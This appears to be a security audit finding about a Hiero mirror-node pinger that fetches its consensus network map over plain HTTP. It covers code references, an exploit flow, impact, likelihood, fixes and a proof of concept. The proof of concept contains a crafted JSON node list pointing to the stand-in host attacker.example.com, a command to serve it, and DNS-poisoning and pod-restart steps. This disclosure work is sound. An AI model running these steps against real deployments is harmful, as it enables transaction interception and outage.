### Title
Network Map Poisoning via Unauthenticated Mirror REST Fetch Enables Transaction Routing Hijack

### Summary
When `HIERO_MIRROR_PINGER_NETWORK=other`, the pinger fetches its entire consensus-node network map from an unauthenticated, unencrypted HTTP endpoint (`HIERO_MIRROR_PINGER_REST`) at startup. Because `submitWithRetry()` never calls `SetNodeAccountIDs()`, the Hiero SDK routes every subsequent transaction to whichever node(s) the client's network map contains. An attacker with a MITM position on that HTTP connection can substitute a crafted response that maps all traffic to a single attacker-controlled gRPC endpoint, requiring no application credentials whatsoever.

### Finding Description

**Exact code path:**

`pinger/sdk_client.go` lines 17–22 — when `network=other`, the entire network map is built exclusively from the mirror REST response and handed directly to `hiero.ClientForNetwork`: [1](#0-0) 

`pinger/mirror_node_client.go` line 46 — the HTTP client has no TLS configuration, no certificate pinning, and no response-integrity check: [2](#0-1) 

`pinger/mirror_node_client.go` lines 79–98 — the raw HTTP response body is decoded directly into the network map with no signature or authenticity verification: [3](#0-2) 

`pinger/transfer.go` lines 29–31 — `NewTransferTransaction()` is constructed with no `SetNodeAccountIDs()` call, so the SDK picks a node freely from the client's (now poisoned) network map: [4](#0-3) 

**Root cause:** The code makes a single, unauthenticated HTTP fetch at startup and unconditionally trusts the returned JSON to define the entire consensus-node topology. There is no TLS enforcement, no HMAC/signature check on the response, and no cross-validation against a known-good node list. The failed assumption is that the mirror REST endpoint is always reachable only by trusted parties over a secure channel.

**Exploit flow:**
1. Attacker achieves a MITM position on the HTTP path between the pinger and `HIERO_MIRROR_PINGER_REST` (DNS poisoning, ARP spoofing, compromised K8s service, or a rogue pod in the same namespace).
2. At pinger startup, `buildNetworkFromMirrorNodes` issues `GET <mirrorRest>/api/v1/network/nodes`.
3. Attacker intercepts and returns a crafted `nodesEnvelope` JSON containing exactly one `nodeEntry` whose `service_endpoints` point to the attacker's gRPC server with a valid-looking `node_account_id` (e.g., `0.0.3`).
4. `fetchMirrorNodeNetwork` builds a `map[string]hiero.AccountID` with only that entry; `hiero.ClientForNetwork(netmap)` creates a client whose entire node pool is the malicious endpoint.
5. Every `submitWithRetry` tick calls `cryptoTransfer.Execute(client)` — with no `SetNodeAccountIDs()` override — so the SDK sends all transactions exclusively to the attacker's node.

### Impact Explanation
The attacker's node receives every signed CryptoTransfer transaction. Concrete consequences:
- **Availability (High):** The attacker can drop all transactions, causing complete pinger failure and false liveness/readiness signals.
- **Confidentiality (Medium):** Transaction metadata (amounts, account IDs, timing) is exposed to the attacker before it reaches the real network.
- **Integrity (Limited):** Transactions are cryptographically signed by the operator key, so the attacker cannot forge or alter them. However, they can selectively replay or delay them.

Severity: **High** (CVSS ~7.5) — full loss of transaction availability and partial confidentiality breach, no fund theft.

### Likelihood Explanation
- Requires `HIERO_MIRROR_PINGER_NETWORK=other` (the only path that uses the mirror REST URL).
- Requires a MITM position at the moment of pinger startup (network map is fetched once, not refreshed).
- In Kubernetes deployments using plain `http://` internal service URLs (the documented example in `config.go` line 37 shows `http://mirror-rest:5551`), DNS spoofing or a rogue pod in the same namespace is a realistic attack vector requiring no application privileges.
- The attack window is narrow (startup only) but repeatable on every pod restart or rollout.

### Recommendation
1. **Enforce HTTPS** for `HIERO_MIRROR_PINGER_REST` and reject `http://` URLs at config validation time (`config.go`).
2. **Verify the mirror REST TLS certificate** — configure the `http.Client` with a pinned CA or at minimum standard system-root verification (already the default for `https://`, but currently bypassed by using plain HTTP).
3. **Pin transactions to known-good nodes** by calling `SetNodeAccountIDs()` with a statically configured list of trusted consensus node account IDs, removing the dependency on the dynamically fetched map for transaction routing.
4. **Periodically re-fetch and diff** the network map against the initial snapshot; alert and halt on unexpected topology changes.

### Proof of Concept

```
# Preconditions:
#   - Pinger deployed with HIERO_MIRROR_PINGER_NETWORK=other
#   - HIERO_MIRROR_PINGER_REST=http://mirror-rest:5551
#   - Attacker controls DNS for "mirror-rest" or has ARP/MITM on the same subnet

# Step 1: Stand up a malicious HTTP server returning a crafted node list
cat > fake_mirror.json << 'EOF'
{
  "nodes": [{
    "node_account_id": "0.0.3",
    "service_endpoints": [{
      "domain_name": "attacker.example.com",
      "ip_address_v4": "",
      "port": 50211
    }],
    "grpc_proxy_endpoint": null
  }],
  "links": {"next": null}
}
EOF
python3 -m http.server 5551  # serve fake_mirror.json at /api/v1/network/nodes

# Step 2: Poison DNS so "mirror-rest" resolves to attacker's IP
#   (or perform ARP spoofing / intercept via rogue K8s service)

# Step 3: Restart the pinger pod
kubectl rollout restart deployment/pinger

# Result:
#   pinger/mirror_node_client.go fetches the poisoned response at startup
#   hiero.ClientForNetwork builds a map with only attacker.example.com:50211
#   Every submitWithRetry() sends CryptoTransfer gRPC calls to attacker.example.com:50211
#   Attacker's gRPC server logs all transaction details and can drop/delay them at will
```
